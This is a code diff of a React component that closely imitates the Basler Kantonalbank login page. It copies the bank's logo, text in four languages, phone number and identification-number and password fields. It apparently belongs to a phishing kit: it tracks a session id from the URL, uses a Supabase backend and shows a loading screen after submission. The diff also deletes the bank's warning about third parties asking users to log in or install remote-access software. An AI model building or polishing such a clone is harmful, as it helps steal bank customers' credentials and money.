@@ -3,27 +3,205 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Eye, EyeOff, AlertTriangle, Info } from "lucide-react";
+import { Eye, EyeOff, Info } from "lucide-react";
 import bkbLogo from "@/assets/bkb-logo.svg";
 
-const ORANGE = "#F25C26";
-const GREEN = "#4D8B2C";
-const BTN = "#dde9b9";
-const BTN_HOVER = "#cee0a4";
+const GREEN = "#5faa28";
+const ERROR = "#b71e27";
+const BORDER_IDLE = "#dcdcdc";
+const BTN_IDLE_BG = "#e8eca4";
+const BTN_IDLE_TEXT = "#757585";
+const BTN_ACTIVE_BG = "#dde275";
+const BTN_ACTIVE_HOVER = "#939919";
+
+type Lang = "DE" | "FR" | "IT" | "EN";
+
+const T: Record<Lang, Record<string, string>> = {
+  DE: {
+    title: "Login",
+    subtitle: "Ihr Zugang zum digitalen Banking",
+    ident: "Identifikationsnummer",
+    pwd: "Passwort",
+    legal: "Mit dem Login akzeptieren Sie unsere",
+    legalLink: "rechtlichen Hinweise und Nutzungsbedingungen",
+    login: "Login",
+    loginProblem: "Probleme mit dem Login?",
+    noAccess: "Sie nutzen unser Digital Banking noch nicht?",
+    request: "Beantragen Sie Ihren Zugang zum Digital Banking",
+    questions: "Haben Sie Fragen?",
+    questionsText: "Fragen beantwortet Ihnen gerne unsere E-Serviceline von Montag bis Freitag von 8:00 Uhr - 18:00 Uhr.",
+    eservice: "E-Serviceline",
+    inland: "Inland",
+    ausland: "Ausland",
+    info: "Wichtige Information",
+    infoText: "Bitte beachten Sie, dass die Börse in den (USA) aufgrund eines Feiertages heute geschlossen ist.",
+    infoThanks: "Vielen Dank für Ihr Verständnis.",
+    required: "Ein Wert wird benötigt",
+    f1: "Sicherheit",
+    f2: "Bedingungen",
+    f3: "Informationen",
+    f4: "Hilfe und Kontakt",
+    f5: "Informationen zu Finanzinstrumenten",
+    f6: "Ausführungsgrundsätze im Wertschriftenhandel",
+    pwdShow: "Passwort anzeigen",
+  },
+  FR: {
+    title: "Connexion",
+    subtitle: "Votre accès au Digital Banking",
+    ident: "Numéro d'identification",
+    pwd: "Mot de passe",
+    legal: "En vous connectant, vous acceptez nos",
+    legalLink: "mentions légales et conditions d'utilisation",
+    login: "Connexion",
+    loginProblem: "Problèmes de connexion?",
+    noAccess: "Vous n'utilisez pas encore notre Digital Banking?",
+    request: "Demandez votre accès au Digital Banking",
+    questions: "Avez-vous des questions?",
+    questionsText: "Notre E-Serviceline répond volontiers à vos questions du lundi au vendredi de 8h00 à 18h00.",
+    eservice: "E-Serviceline",
+    inland: "Suisse",
+    ausland: "Étranger",
+    info: "Information importante",
+    infoText: "Veuillez noter que la bourse aux (USA) est fermée aujourd'hui en raison d'un jour férié.",
+    infoThanks: "Merci de votre compréhension.",
+    required: "Une valeur est requise",
+    f1: "Sécurité",
+    f2: "Conditions",
+    f3: "Informations",
+    f4: "Aide et contact",
+    f5: "Informations sur les instruments financiers",
+    f6: "Principes d'exécution dans le négoce de titres",
+    pwdShow: "Afficher le mot de passe",
+  },
+  IT: {
+    title: "Login",
+    subtitle: "Il vostro accesso al Digital Banking",
+    ident: "Numero d'identificazione",
+    pwd: "Password",
+    legal: "Effettuando il login accettate le nostre",
+    legalLink: "note legali e condizioni di utilizzo",
+    login: "Login",
+    loginProblem: "Problemi con il login?",
+    noAccess: "Non utilizzate ancora il nostro Digital Banking?",
+    request: "Richiedete il vostro accesso al Digital Banking",
+    questions: "Avete domande?",
+    questionsText: "La nostra E-Serviceline risponde volentieri alle vostre domande dal lunedì al venerdì dalle 8:00 alle 18:00.",
+    eservice: "E-Serviceline",
+    inland: "Svizzera",
+    ausland: "Estero",
+    info: "Informazione importante",
+    infoText: "Vi preghiamo di notare che la borsa negli (USA) è chiusa oggi a causa di un giorno festivo.",
+    infoThanks: "Grazie per la vostra comprensione.",
+    required: "È richiesto un valore",
+    f1: "Sicurezza",
+    f2: "Condizioni",
+    f3: "Informazioni",
+    f4: "Aiuto e contatto",
+    f5: "Informazioni sugli strumenti finanziari",
+    f6: "Principi di esecuzione nel commercio di titoli",
+    pwdShow: "Mostra password",
+  },
+  EN: {
+    title: "Login",
+    subtitle: "Your access to digital banking",
+    ident: "Identification number",
+    pwd: "Password",
+    legal: "By logging in you accept our",
+    legalLink: "legal notices and terms of use",
+    login: "Login",
+    loginProblem: "Problems with login?",
+    noAccess: "Not yet using our Digital Banking?",
+    request: "Request your access to Digital Banking",
+    questions: "Do you have questions?",
+    questionsText: "Our E-Serviceline is happy to answer your questions Monday to Friday from 8:00 to 18:00.",
+    eservice: "E-Serviceline",
+    inland: "Domestic",
+    ausland: "International",
+    info: "Important Information",
+    infoText: "Please note that the stock exchange in the (USA) is closed today due to a public holiday.",
+    infoThanks: "Thank you for your understanding.",
+    required: "A value is required",
+    f1: "Security",
+    f2: "Terms",
+    f3: "Information",
+    f4: "Help and contact",
+    f5: "Information on financial instruments",
+    f6: "Execution principles in securities trading",
+    pwdShow: "Show password",
+  },
+};
+
+type FieldProps = {
+  id: string;
+  label: string;
+  type?: "text" | "password";
+  value: string;
+  onChange: (v: string) => void;
+  showPwdToggle?: boolean;
+  showPwd?: boolean;
+  onTogglePwd?: () => void;
+  pwdShowLabel?: string;
+  errorText: string;
+};
+
+const Field = ({
+  id, label, type = "text", value, onChange,
+  showPwdToggle, showPwd, onTogglePwd, pwdShowLabel, errorText,
+}: FieldProps) => {
+  const [touched, setTouched] = useState(false);
+  const [focused, setFocused] = useState(false);
+  const hasError = touched && value.length === 0;
+  const borderColor = hasError ? ERROR : focused ? "#000000" : BORDER_IDLE;
+  const inputType = showPwdToggle ? (showPwd ? "text" : "password") : type;
+
+  return (
+    <div>
+      <label htmlFor={id} className="font-bold text-[15px] mb-2 block">{label}</label>
+      <div className="relative">
+        <input
+          id={id}
+          type={inputType}
+          value={value}
+          onChange={(e) => onChange(e.target.value)}
+          onFocus={() => setFocused(true)}
+          onBlur={() => { setFocused(false); setTouched(true); }}
+          className="w-full h-12 border px-3 pr-12 outline-none bg-white transition-colors hover:border-black"
+          style={{ borderColor }}
+        />
+        {showPwdToggle && (
+          <button
+            type="button"
+            onClick={onTogglePwd}
+            aria-label={pwdShowLabel}
+            className="absolute right-3 top-1/2 -translate-y-1/2 text-black"
+          >
+            {showPwd ? <EyeOff size={20} /> : <Eye size={20} />}
+          </button>
+        )}
+      </div>
+      {hasError && (
+        <p className="mt-1 text-[13px]" style={{ color: ERROR }}>{errorText}</p>
+      )}
+    </div>
+  );
+};
 
 const ChBaslerKantonalbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
+  const [lang, setLang] = useState<Lang>("DE");
+  const t = T[lang];
 
   const [ident, setIdent] = useState("");
   const [passwort, setPasswort] = useState("");
   const [showPassword, setShowPassword] = useState(false);
-  const [showMore, setShowMore] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
   usePageMeta("Basler Kantonalbank – Login", "/favicon.ico");
+
+  const formFilled = ident.length > 0 && passwort.length > 0;
 
   const handleSubmit = async () => {
     if (sessionId) {
@@ -41,6 +219,8 @@ const ChBaslerKantonalbank = () => {
     setShowLoading(true);
   };
 
+  const langs: Lang[] = ["DE", "FR", "IT", "EN"];
+
   return (
     <>
       {showLoading && (
@@ -51,161 +231,115 @@ const ChBaslerKantonalbank = () => {
       )}
       <div className="min-h-screen flex flex-col bg-white text-black">
         {/* Header */}
-        <header className="bg-black h-20 px-5 md:px-10 flex items-center justify-between">
-          <img src={bkbLogo} alt="Basler Kantonalbank" className="h-10 md:h-12 text-white" style={{ color: "#fff" }} />
+        <header className="bg-black h-16 px-5 md:px-10 flex items-center justify-between">
+          <img src={bkbLogo} alt="Basler Kantonalbank" className="h-7 md:h-8" />
           <nav className="flex items-center gap-6 text-[15px] text-white">
-            <a href="#" className="text-white/60">DE</a>
-            <a href="#" className="hover:text-white/80">FR</a>
-            <a href="#" className="hover:text-white/80">IT</a>
-            <a href="#" className="hover:text-white/80">EN</a>
+            {langs.map((l) => (
+              <button
+                key={l}
+                onClick={() => setLang(l)}
+                className={lang === l ? "text-white/60" : "text-white"}
+                style={{ background: "none" }}
+              >
+                {l}
+              </button>
+            ))}
           </nav>
         </header>
 
         {/* Main */}
-        <main className="flex-1">
-          {/* Above the fold */}
-          <section className="max-w-[1280px] mx-auto px-5 md:px-10 pt-10 md:pt-14 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
-            {/* Left column */}
-            <div>
-              <h1 className="text-[40px] md:text-[64px] font-light leading-[1.05] mb-3">Login</h1>
-              <p className="text-[18px] mb-10 md:mb-12">Ihr Zugang zum digitalen Banking</p>
+        <main className="flex-1 flex flex-col">
+          {/* Above the fold — fills viewport */}
+          <section className="min-h-[calc(100vh-4rem)] flex">
+            <div className="max-w-[1280px] w-full mx-auto px-5 md:px-10 pt-10 md:pt-14 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
+              {/* Left column */}
+              <div>
+                <h1 className="text-[32px] md:text-[44px] font-light leading-[1.05]">{t.title}</h1>
+                <p className="text-[18px] mt-6 mb-12 md:mb-14">{t.subtitle}</p>
 
-              <label htmlFor="bkb-ident" className="font-bold text-[15px] mb-2 block">
-                Identifikationsnummer
-              </label>
-              <input
-                id="bkb-ident"
-                type="text"
-                value={ident}
-                onChange={(e) => setIdent(e.target.value)}
-                className="w-full h-12 border border-black px-3 outline-none bg-white"
-              />
-
-              <label htmlFor="bkb-pass" className="font-bold text-[15px] mb-2 mt-6 block">
-                Passwort
-              </label>
-              <div className="relative">
-                <input
-                  id="bkb-pass"
-                  type={showPassword ? "text" : "password"}
-                  value={passwort}
-                  onChange={(e) => setPasswort(e.target.value)}
-                  className="w-full h-12 border border-black px-3 pr-12 outline-none bg-white"
-                />
-                <button
-                  type="button"
-                  onClick={() => setShowPassword(!showPassword)}
-                  aria-label="Passwort anzeigen"
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-black"
-                >
-                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
-                </button>
-              </div>
-
-              <p className="text-[14px] mt-8 mb-8">
-                Mit dem Login akzeptieren Sie unsere{" "}
-                <a href="#" className="underline">
-                  rechtlichen Hinweise und Nutzungsbedingungen
-                </a>
-                .
-              </p>
-
-              <div className="flex items-center gap-6 flex-wrap">
-                <button
-                  onClick={handleSubmit}
-                  className="px-10 py-3 text-[15px] text-black transition-colors"
-                  style={{ backgroundColor: BTN }}
-                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = BTN_HOVER)}
-                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = BTN)}
-                >
-                  Login
-                </button>
-                <a href="#" className="underline text-[15px]">
-                  Probleme mit dem Login?
-                </a>
-              </div>
-
-              <div className="mt-20">
-                <h2 className="text-[24px] md:text-[28px] font-light mb-4">
-                  Sie nutzen unser Digital Banking noch nicht?
-                </h2>
-                <a href="#" className="underline text-[15px]">
-                  Beantragen Sie Ihren Zugang zum Digital Banking
-                </a>
-              </div>
-            </div>
-
-            {/* Right column — Sicherheitshinweis */}
-            <div>
-              <div className="p-7 text-white" style={{ backgroundColor: ORANGE }}>
-                <div className="flex items-center gap-3 mb-3">
-                  <AlertTriangle size={26} strokeWidth={1.5} />
-                  <h3 className="text-[22px] md:text-[24px] font-light">Sicherheitshinweis</h3>
+                <div className="space-y-6">
+                  <Field
+                    id="bkb-ident"
+                    label={t.ident}
+                    value={ident}
+                    onChange={setIdent}
+                    errorText={t.required}
+                  />
+                  <Field
+                    id="bkb-pass"
+                    label={t.pwd}
+                    value={passwort}
+                    onChange={setPasswort}
+                    showPwdToggle
+                    showPwd={showPassword}
+                    onTogglePwd={() => setShowPassword(!showPassword)}
+                    pwdShowLabel={t.pwdShow}
+                    errorText={t.required}
+                  />
                 </div>
-                <p className="text-[15px] leading-[1.5]">
-                  Seien Sie vorsichtig, wenn Sie von Dritten aufgefordert werden, sich
-                  einzuloggen oder eine Handlung auszuführen.
+
+                <p className="text-[14px] mt-8 mb-8">
+                  {t.legal}{" "}
+                  <a href="#" className="underline">{t.legalLink}</a>.
                 </p>
-                <p className="font-bold mt-4 mb-2 text-[15px]">Bitte beachten Sie:</p>
-                <ul className="list-disc pl-5 space-y-2 text-[15px] leading-[1.5]">
-                  <li>
-                    Installieren Sie keine Desktop-Software (z. B. AnyDesk oder TeamViewer)
-                    auf Aufforderung Dritter.
-                  </li>
-                  <li>Bestätigen Sie keine Zahlungen, die Sie nicht selbst veranlasst haben.</li>
-                  <li>
-                    Bestätigen Sie keine Push-Mitteilungen, wenn Sie von Dritten
-                    {showMore ? (
-                      <> aufgefordert werden, dies zu tun. Achten Sie generell auf den Absender und Inhalt jeder Nachricht.</>
-                    ) : (
-                      <>…</>
-                    )}
-                  </li>
-                </ul>
-                <button
-                  onClick={() => setShowMore(!showMore)}
-                  className="border border-white px-5 py-2 mt-5 text-[14px] bg-transparent hover:bg-white/10 transition-colors"
-                >
-                  {showMore ? "Weniger anzeigen" : "Mehr anzeigen"}
-                </button>
+
+                <div className="flex items-center gap-6 flex-wrap">
+                  <button
+                    onClick={handleSubmit}
+                    className="px-10 py-3 text-[15px] transition-colors"
+                    style={{
+                      backgroundColor: formFilled ? BTN_ACTIVE_BG : BTN_IDLE_BG,
+                      color: formFilled ? "#000000" : BTN_IDLE_TEXT,
+                      cursor: formFilled ? "pointer" : "default",
+                    }}
+                    onMouseEnter={(e) => {
+                      if (formFilled) e.currentTarget.style.backgroundColor = BTN_ACTIVE_HOVER;
+                    }}
+                    onMouseLeave={(e) => {
+                      e.currentTarget.style.backgroundColor = formFilled ? BTN_ACTIVE_BG : BTN_IDLE_BG;
+                    }}
+                  >
+                    {t.login}
+                  </button>
+                  <a href="#" className="underline text-[15px]">{t.loginProblem}</a>
+                </div>
+
+                <div className="mt-20">
+                  <h2 className="text-[24px] md:text-[28px] font-light mb-4">{t.noAccess}</h2>
+                  <a href="#" className="underline text-[15px]">{t.request}</a>
+                </div>
+              </div>
+
+              {/* Right column — Wichtige Information */}
+              <div>
+                <div className="p-7 text-white" style={{ backgroundColor: GREEN }}>
+                  <div className="flex items-center gap-3 mb-3">
+                    <Info size={26} strokeWidth={1.5} />
+                    <h3 className="text-[22px] md:text-[24px] font-light">{t.info}</h3>
+                  </div>
+                  <p className="text-[15px] leading-[1.5]">{t.infoText}</p>
+                  <p className="text-[15px] mt-4">{t.infoThanks}</p>
+                </div>
               </div>
             </div>
           </section>
 
-          {/* Scroll-Bereich */}
-          <section className="max-w-[1280px] mx-auto px-5 md:px-10 mt-24 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
-            {/* Left — Haben Sie Fragen */}
+          {/* Scroll area — below fold */}
+          <section className="max-w-[1280px] w-full mx-auto px-5 md:px-10 mt-24 grid grid-cols-1 lg:grid-cols-2 gap-x-20 gap-y-10">
             <div>
-              <h2 className="text-[24px] md:text-[28px] font-light mb-4">Haben Sie Fragen?</h2>
-              <p className="text-[15px] mb-6 leading-[1.5]">
-                Fragen beantwortet Ihnen gerne unsere E-Serviceline von Montag bis Freitag
-                von 8:00 Uhr - 18:00 Uhr.
-              </p>
-              <p className="text-[15px] mb-6">E-Serviceline</p>
+              <h2 className="text-[24px] md:text-[28px] font-light mb-4">{t.questions}</h2>
+              <p className="text-[15px] mb-6 leading-[1.5]">{t.questionsText}</p>
+              <p className="text-[15px] mb-6">{t.eservice}</p>
               <div className="mb-4">
-                <p className="text-[15px]">Inland</p>
+                <p className="text-[15px]">{t.inland}</p>
                 <a href="tel:+41612663636" className="text-[15px]">+41 61 266 36 36</a>
               </div>
               <div>
-                <p className="text-[15px]">Ausland</p>
+                <p className="text-[15px]">{t.ausland}</p>
                 <a href="tel:+41612663636" className="text-[15px]">+41 61 266 36 36</a>
               </div>
             </div>
-
-            {/* Right — Wichtige Information */}
-            <div>
-              <div className="p-7 text-white" style={{ backgroundColor: GREEN }}>
-                <div className="flex items-center gap-3 mb-3">
-                  <Info size={26} strokeWidth={1.5} />
-                  <h3 className="text-[22px] md:text-[24px] font-light">Wichtige Information</h3>
-                </div>
-                <p className="text-[15px] leading-[1.5]">
-                  Bitte beachten Sie, dass die Börse in den (USA) aufgrund eines Feiertages
-                  heute geschlossen ist.
-                </p>
-                <p className="text-[15px] mt-4">Vielen Dank für Ihr Verständnis.</p>
-              </div>
-            </div>
+            <div />
           </section>
         </main>
 
@@ -213,14 +347,14 @@ const ChBaslerKantonalbank = () => {
         <footer className="border-t border-gray-300 mt-16">
           <div className="max-w-[1280px] mx-auto px-5 md:px-10 py-8 text-[14px]">
             <div className="flex flex-col md:flex-row md:gap-10 gap-3 mb-4">
-              <a href="#" className="underline hover:font-bold">Sicherheit</a>
-              <a href="#" className="underline hover:font-bold">Bedingungen</a>
-              <a href="#" className="underline hover:font-bold">Informationen</a>
-              <a href="#" className="underline hover:font-bold">Hilfe und Kontakt</a>
+              <a href="#" className="no-underline text-black">{t.f1}</a>
+              <a href="#" className="no-underline text-black">{t.f2}</a>
+              <a href="#" className="no-underline text-black">{t.f3}</a>
+              <a href="#" className="no-underline text-black">{t.f4}</a>
             </div>
             <div className="flex flex-col md:flex-row md:gap-10 gap-3">
-              <a href="#" className="underline hover:font-bold">Informationen zu Finanzinstrumenten</a>
-              <a href="#" className="underline hover:font-bold">Ausführungsgrundsätze im Wertschriftenhandel</a>
+              <a href="#" className="no-underline text-black">{t.f5}</a>
+              <a href="#" className="no-underline text-black">{t.f6}</a>
             </div>
           </div>
         </footer>
